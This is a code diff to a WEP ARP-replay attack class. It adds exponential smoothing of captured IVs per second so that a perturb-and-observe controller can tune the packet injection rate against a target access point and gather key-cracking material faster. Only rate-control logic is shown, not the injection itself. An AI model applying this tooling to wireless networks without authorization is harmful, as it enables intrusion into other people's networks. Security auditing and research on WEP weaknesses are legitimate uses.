@@ -77,6 +77,11 @@ class WepArpReplay:
     # Relative improvement deadband — reverse only on a real drop, so window
     # noise doesn't thrash the rate.
     _PO_IMPROVE_EPS = 0.05
+    # EWMA smoothing of the per-window IVs/s before P&O acts on it. Damps the
+    # queue-drain transient (lowering the rate briefly SPIKES captured IVs/s as
+    # the AP's backlog flushes — raw, that fools P&O into "lower = better").
+    # ~0.3 keeps a recent-weighted ~3-window memory.
+    _IVS_EWMA_ALPHA = 0.3
     # How long to keep testing one candidate before judging it (seconds). The
     # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
     _TRIAL_WINDOW = 2.5
@@ -125,8 +130,9 @@ class WepArpReplay:
         # P&O rate-controller state (1s windows; rate = packets/window = pps).
         self._rate = self._PO_START_PPS       # current target injection pps
         self._rate_step = self._PO_STEP_PPS   # signed perturbation
-        self._po_prev_ivs_s = -1.0            # previous window's IVs/s
-        self._last_ivs_s = 0.0                # this window's IVs/s (set by burst)
+        self._po_prev_ivs_s = -1.0            # previous (smoothed) IVs/s
+        self._last_ivs_s = 0.0                # this window's RAW IVs/s
+        self._ivs_ewma = -1.0                 # smoothed IVs/s (what P&O acts on)
 
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
@@ -158,6 +164,7 @@ class WepArpReplay:
         self._rate = self._PO_START_PPS
         self._rate_step = self._PO_STEP_PPS
         self._po_prev_ivs_s = -1.0
+        self._ivs_ewma = -1.0
         self._task = asyncio.create_task(self._replay_loop())
         logger.info("[WEP-ARP] Replay started on %s", self.bssid)
 
@@ -326,7 +333,14 @@ class WepArpReplay:
         self.stats.burst_size = sent
         gain = self.collector.unique_count(self.bssid) - ivs_before
         self.stats.last_gain = gain
-        self._last_ivs_s = gain / window_dt           # IVs/s this window (P&O)
+        raw_ivs_s = gain / window_dt
+        self._last_ivs_s = raw_ivs_s
+        # EWMA so P&O reacts to the trend, not the queue-drain spike.
+        a = self._IVS_EWMA_ALPHA
+        self._ivs_ewma = (
+            raw_ivs_s if self._ivs_ewma < 0
+            else a * raw_ivs_s + (1.0 - a) * self._ivs_ewma
+        )
         return gain
 
     def _judge(self, gain: int) -> None:
@@ -379,14 +393,16 @@ class WepArpReplay:
     def _maybe_adjust_rate(self) -> None:
         """Perturb-and-observe step, run once per 1s window — ONLY while
         replaying a winner (else IVs/s isn't a clean function of our rate). Keep
-        the perturbation's direction if this window's IVs/s beat the last one's,
-        else reverse; then step the rate. The rate walks toward more IVs/s and
-        dithers around the peak — wherever the AP actually tops out.
+        the perturbation's direction if the SMOOTHED (EWMA) IVs/s beat the last
+        step's, else reverse; then step the rate. The rate walks toward more
+        IVs/s and dithers around the peak — wherever the AP actually tops out.
         """
         if self.state != "replaying":
-            self._po_prev_ivs_s = -1.0   # no steady signal → reset the baseline
+            # No steady signal → reset the baseline + smoothing for next time.
+            self._po_prev_ivs_s = -1.0
+            self._ivs_ewma = -1.0
             return
-        measured = self._last_ivs_s      # IVs/s captured this window
+        measured = self._ivs_ewma        # smoothed IVs/s (damps queue spikes)
         if self._po_prev_ivs_s < 0:
             self._po_prev_ivs_s = measured   # first window: just set baseline
         else:
